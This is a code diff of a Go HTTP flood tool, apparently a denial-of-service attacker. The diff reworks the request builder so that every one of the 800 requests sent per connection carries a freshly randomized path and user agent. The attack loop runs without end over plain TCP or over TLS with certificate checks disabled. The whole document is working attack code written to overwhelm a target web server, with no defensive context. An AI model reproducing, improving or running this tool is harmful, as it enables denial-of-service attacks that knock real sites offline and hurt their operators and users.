@@ -88,56 +88,52 @@ func getuseragent() string {
 }
 
 func getheader() string {
+	if rpath == true {
+		roption := rand.Intn(3)
+		if roption == 1 {
+			path = "/?=" + a_z[rand.Intn(len(a_z))] + a_z[rand.Intn(len(a_z))] + a_z[rand.Intn(len(a_z))] + a_z[rand.Intn(len(a_z))] + a_z[rand.Intn(len(a_z))] + a_z[rand.Intn(len(a_z))] + a_z[rand.Intn(len(a_z))] + a_z[rand.Intn(len(a_z))] + ".php"
+		} else if roption == 2 {
+			path = "/index.php"
+		} else if roption == 3 {
+			path = "/index.php?=" + strconv.Itoa(rand.Intn(200))
+		} else {
+			path = "/"
+		}
+	}
+	get_host := fmt.Sprintf("GET %s HTTP/1.1\r\nHost:%s:%d\r\n", path, ip, port)
 	connection := "Connection: keep-alive\r\n"
 	accept := acceptall[rand.Intn(len(acceptall))]
 	referer := "Referer: " + "https://" + ip + "/" + "\r\n"
 	useragent := "User-Agent: " + getuseragent() + "\r\n"
-	header := useragent + connection + accept + referer + "\r\n"
-	return header
+	return get_host + useragent + connection + accept + referer + "\r\n"
 }
 
 func attack() {
 	var err error
-	header := getheader()
 	for {
-		if rpath == true {
-			roption := rand.Intn(3)
-			if roption == 1 {
-				path = "/?=" + a_z[rand.Intn(len(a_z))] + a_z[rand.Intn(len(a_z))] + a_z[rand.Intn(len(a_z))] + a_z[rand.Intn(len(a_z))] + a_z[rand.Intn(len(a_z))] + a_z[rand.Intn(len(a_z))] + a_z[rand.Intn(len(a_z))] + a_z[rand.Intn(len(a_z))] + ".php"
-			} else if roption == 2 {
-				path = "/index.php"
-			} else if roption == 3 {
-				path = "/?=" + strconv.Itoa(rand.Intn(99))
-			} else {
-				path = "/"
-			}
-		}
-		get_host := fmt.Sprintf("GET %s HTTP/1.1\r\nHost:%s:%d\r\n", path, ip, port)
-		request := get_host + header
-		addr := ip + ":" + strconv.Itoa(port)
 		if port == 443 {
 			var x net.Conn
 			cfg := &tls.Config{
 				InsecureSkipVerify: true,
 				ServerName:         ip, //simple fix
 			}
-			x, err = tls.Dial("tcp", addr, cfg)
+			x, err = tls.Dial("tcp", fmt.Sprintf("%s:%d", ip, port), cfg)
 			if err != nil {
 				fmt.Println("Connection Down!!!")
 			} else {
 				for i := 0; i < 800; i++ {
-					x.Write([]byte(request))
+					x.Write([]byte(getheader()))
 				}
 				x.Close()
 			}
 		} else {
 			var s net.Conn
-			s, err = net.Dial("tcp", addr)
+			s, err = net.Dial("tcp", fmt.Sprintf("%s:%d", ip, port))
 			if err != nil {
 				fmt.Println("Connection Down!!!")
 			} else {
 				for i := 0; i < 800; i++ {
-					s.Write([]byte(request))
+					s.Write([]byte(getheader()))
 				}
 				s.Close()
 			}
